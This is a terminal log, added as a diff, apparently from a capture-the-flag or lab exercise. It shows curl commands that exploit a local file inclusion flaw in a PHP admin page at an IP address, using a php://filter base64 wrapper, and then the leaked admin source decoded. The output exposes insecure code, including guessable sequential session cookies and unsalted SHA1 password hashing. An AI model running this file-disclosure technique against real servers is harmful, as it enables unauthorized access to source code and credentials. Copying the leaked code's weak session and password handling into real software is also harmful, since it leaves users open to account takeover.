@@ -1,0 +1,136 @@
+┌──(kaliroot㉿kaliroot)-[~]
+└─$ curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins"
+PD9waHANCg0KcmVxdWlyZV9vbmNlKCJvdXJkYi5waHAiKTsNCg0KY2xhc3MgQWRtaW5zDQp7DQogICBzdGF0aWMgcHVibGljICRIT01FX1VSTCA9ICIvYWRtaW4vaW5kZXgucGhwP3BhZ2U9aG9tZSI7DQogICBzdGF0aWMgcHVibGljICRMT0dJTl9VUkwgPSAiL2FkbWluL2luZGV4LnBocD9wYWdlPWxvZ2luIjsNCiAgIHN0YXRpYyBwdWJsaWMgJENSRUFURV9VUkwgPSAiL2FkbWluL2luZGV4LnBocD9wYWdlPWNyZWF0ZSI7DQogICBzdGF0aWMgcHVibGljICRjdXJfYWRtaW4gPSBGYWxzZTsNCg0KICAgZnVuY3Rpb24gZ2V0X2FkbWluX2lkKCRhZG1pbmlkKQ0KICAgew0KICAgICAgJHF1ZXJ5ID0gc3ByaW50ZigiU0VMRUNUICogZnJvbSBhZG1pbiB3aGVyZSBpZCA9ICclZCciLA0KCQkgICAgICAgbXlzcWxfcmVhbF9lc2NhcGVfc3RyaW5nKCR1c2VyaWQpKTsNCiAgICAgICRyZXMgPSBteXNxbF9xdWVyeSgkcXVlcnkpOw0KICAgICAgaWYgKCRyZXMpDQogICAgICB7DQoJIHJldHVybiBteXNxbF9mZXRjaF9hc3NvYygkcmVzKTsNCiAgICAgIH0NCiAgICAgIGVsc2UNCiAgICAgIHsNCgkgcmV0dXJuIEZhbHNlOw0KICAgICAgfQ0KICAgfQ0KDQogICBmdW5jdGlvbiBnZXRfYWRtaW5fc2Vzc2lvbigkc2Vzc2lkKQ0KICAgew0KICAgICAgJHF1ZXJ5ID0gc3ByaW50ZigiU0VMRUNUIGFkbWluLmlkLCBhZG1pbi5sb2dpbiwgYWRtaW4ucGFzc3dvcmQgZnJvbSBhZG1pbiwgYWRtaW5fc2Vzc2lvbiB3aGVyZSBhZG1pbl9zZXNzaW9uLmlkID0gJyVzJyBhbmQgYWRtaW5fc2Vzc2lvbi5hZG1pbl9pZCA9IGFkbWluLmlkIGxpbWl0IDE7IiwNCgkJICAgICAgIG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygkc2Vzc2lkKSk7DQogICAgICAkcmVzID0gbXlzcWxfcXVlcnkoJHF1ZXJ5KTsNCiAgICAgIGlmICgkcmVzKQ0KICAgICAgew0KCSByZXR1cm4gbXlzcWxfZmV0Y2hfYXNzb2MoJHJlcyk7DQogICAgICB9DQogICAgICBlbHNlDQogICAgICB7DQoJIHJldHVybiBGYWxzZTsNCiAgICAgIH0NCiAgIH0NCg0KICAgZnVuY3Rpb24gY3JlYXRlX2FkbWluKCRsb2dpbiwgJHBhc3MpDQogICB7DQogICAgICAkcXVlcnkgPSBzcHJpbnRmKCJJTlNFUlQgaW50byBgYWRtaW5gIChgaWRgLCBgbG9naW5gLCBgcGFzc3dvcmRgKSBWQUxVRVMgKE5VTEwsICclcycsIFNIQTEoJyVzJykpOyIsDQoJCSAgICAgICBteXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJGxvZ2luKSwNCgkJICAgICAgIG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygkcGFzcykpOw0KICAgICAgaWYgKCRyZXMgPSBteXNxbF9xdWVyeSgkcXVlcnkpKQ0KICAgICAgew0KCSByZXR1cm4gbXlzcWxfaW5zZXJ0X2lkKCk7DQogICAgICB9DQogICAgICBlbHNlDQogICAgICB7DQoJIHJldHVybiBGYWxzZTsNCiAgICAgIH0NCiAgIH0NCg0KICAgZnVuY3Rpb24gbG9naW5fYWRtaW4oJGFkbWluaWQpDQogICB7DQogICAgICAvLyBEb24ndCB0cnVzdCB0aGUgcGhwIHNlc3Npb24sIHdlJ3JlIHVzaW5nIG91ciBvd24NCiAgICAgICRxdWVyeSA9IHNwcmludGYoIklOU0VSVCBpbnRvIGBhZG1pbl9zZXNzaW9uYCAoYGlkYCwgYGFkbWluX2lkYCwgYGNyZWF0ZWRfb25gKSBWQUxVRVMgKE5VTEwsICclcycsIE5PVygpKTsiLA0KCQkgICAgICAgbXlzcWxfcmVhbF9lc2NhcGVfc3RyaW5nKCRhZG1pbmlkKSk7DQogICAgICBpZiAoJHJlcyA9IG15c3FsX3F1ZXJ5KCRxdWVyeSkpDQogICAgICB7DQoJIC8vIGFkZCB0aGUgY29va2llDQoJICRpZCA9IG15c3FsX2luc2VydF9pZCgpOw0KCSBzZXRjb29raWUoInNlc3Npb24iLCAkaWQpOw0KCSByZXR1cm4gbXlzcWxfaW5zZXJ0X2lkKCk7DQogICAgICB9DQogICAgICBlbHNlDQogICAgICB7DQoJIHJldHVybiBGYWxzZTsNCiAgICAgIH0NCiAgIH0NCiAgIGZ1bmN0aW9uIGNsZWFuX2FkbWluX3Nlc3Npb24oKQ0KICAgew0KICAgICAgbXlzcWxfcXVlcnkoIkRFTEVURSBmcm9tIGFkbWluX3Nlc3Npb24gV0hFUkUgY3JlYXRlZF9vbiA8IERBVEVfU1VCKCBOT1coKSwgSU5URVJWQUwgMSBIT1VSICk7Iik7DQogICB9DQoNCiAgIGZ1bmN0aW9uIGNoZWNrX2xvZ2luKCRhZG1pbiwgJHBhc3MpDQogICB7DQogICAgICAkcXVlcnkgPSBzcHJpbnRmKCJTRUxFQ1QgKiBmcm9tIGBhZG1pbmAgd2hlcmUgYGxvZ2luYCBsaWtlICclcycgYW5kIGBwYXNzd29yZGAgPSBTSEExKCAnJXMnICkgbGltaXQgMTsiLA0KCQkgICAgICAgbXlzcWxfcmVhbF9lc2NhcGVfc3RyaW5nKCRhZG1pbiksDQoJCSAgICAgICBteXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJHBhc3MpKTsNCiAgICAgICRyZXMgPSBteXNxbF9xdWVyeSgkcXVlcnkpOw0KICAgICAgaWYgKCRyZXMpDQogICAgICB7DQoJIHJldHVybiBteXNxbF9mZXRjaF9hc3NvYygkcmVzKTsNCiAgICAgIH0NCiAgICAgIGVsc2UNCiAgICAgIHsNCgkgcmV0dXJuIEZhbHNlOw0KICAgICAgfQ0KICAgfQ0KDQogICBmdW5jdGlvbiBjdXJyZW50X2FkbWluKCkNCiAgIHsNCiAgICAgIGlmIChpc3NldCgkX0NPT0tJRVsnc2Vzc2lvbiddKSkNCiAgICAgIHsNCgkgaWYgKCEkY3VyX2FkbWluKQ0KCSB7DQoJICAgIEFkbWluczo6Y2xlYW5fYWRtaW5fc2Vzc2lvbigpOw0KCSAgICAkY3VyX3VzZXIgPSBBZG1pbnM6OmdldF9hZG1pbl9zZXNzaW9uKCRfQ09PS0lFWydzZXNzaW9uJ10pOw0KCSB9DQoJIHJldHVybiAkY3VyX3VzZXI7DQogICAgICB9DQogICAgICBlbHNlDQogICAgICB7DQoJIHJldHVybiBGYWxzZTsNCiAgICAgIH0NCiAgIH0NCg0KICAgZnVuY3Rpb24gaXNfbG9nZ2VkX2luKCkNCiAgIHsNCiAgICAgIGlmIChBZG1pbnM6OmN1cnJlbnRfYWRtaW4oKSkNCiAgICAgIHsNCgkgcmV0dXJuIHRydWU7DQogICAgICB9DQogICAgICBlbHNlDQogICAgICB7DQoJIHJldHVybiBGYWxzZTsNCiAgICAgIH0NCiAgIH0NCiAgIA0KDQoNCn0NCg0KPz4=
+
+
+
+┌──(kaliroot㉿kaliroot)-[~]
+└─$ curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins" -s | base64 -d
+<?php
+
+require_once("ourdb.php");
+
+class Admins
+{
+   static public $HOME_URL = "/admin/index.php?page=home";
+   static public $LOGIN_URL = "/admin/index.php?page=login";
+   static public $CREATE_URL = "/admin/index.php?page=create";
+   static public $cur_admin = False;
+
+   function get_admin_id($adminid)
+   {
+      $query = sprintf("SELECT * from admin where id = '%d'",
+                       mysql_real_escape_string($userid));
+      $res = mysql_query($query);
+      if ($res)
+      {
+         return mysql_fetch_assoc($res);
+      }
+      else
+      {
+         return False;
+      }
+   }
+
+   function get_admin_session($sessid)
+   {
+      $query = sprintf("SELECT admin.id, admin.login, admin.password from admin, admin_session where admin_session.id = '%s' and admin_session.admin_id = admin.id limit 1;",
+                       mysql_real_escape_string($sessid));
+      $res = mysql_query($query);
+      if ($res)
+      {
+         return mysql_fetch_assoc($res);
+      }
+      else
+      {
+         return False;
+      }
+   }
+
+   function create_admin($login, $pass)
+   {
+      $query = sprintf("INSERT into `admin` (`id`, `login`, `password`) VALUES (NULL, '%s', SHA1('%s'));",
+                       mysql_real_escape_string($login),
+                       mysql_real_escape_string($pass));
+      if ($res = mysql_query($query))
+      {
+         return mysql_insert_id();
+      }
+      else
+      {
+         return False;
+      }
+   }
+
+   function login_admin($adminid)
+   {
+      // Don't trust the php session, we're using our own
+      $query = sprintf("INSERT into `admin_session` (`id`, `admin_id`, `created_on`) VALUES (NULL, '%s', NOW());",
+                       mysql_real_escape_string($adminid));
+      if ($res = mysql_query($query))
+      {
+         // add the cookie
+         $id = mysql_insert_id();
+         setcookie("session", $id);
+         return mysql_insert_id();
+      }
+      else
+      {
+         return False;
+      }
+   }
+   function clean_admin_session()
+   {
+      mysql_query("DELETE from admin_session WHERE created_on < DATE_SUB( NOW(), INTERVAL 1 HOUR );");
+   }
+
+   function check_login($admin, $pass)
+   {
+      $query = sprintf("SELECT * from `admin` where `login` like '%s' and `password` = SHA1( '%s' ) limit 1;",
+                       mysql_real_escape_string($admin),
+                       mysql_real_escape_string($pass));
+      $res = mysql_query($query);
+      if ($res)
+      {
+         return mysql_fetch_assoc($res);
+      }
+      else
+      {
+         return False;
+      }
+   }
+
+   function current_admin()
+   {
+      if (isset($_COOKIE['session']))
+      {
+         if (!$cur_admin)
+         {
+            Admins::clean_admin_session();
+            $cur_user = Admins::get_admin_session($_COOKIE['session']);
+         }
+         return $cur_user;
+      }
+      else
+      {
+         return False;
+      }
+   }
+
+   function is_logged_in()
+   {
+      if (Admins::current_admin())
+      {
+         return true;
+      }
+      else
+      {
+         return False;
+      }
+   }
+   
+
+
+}
+
+?>
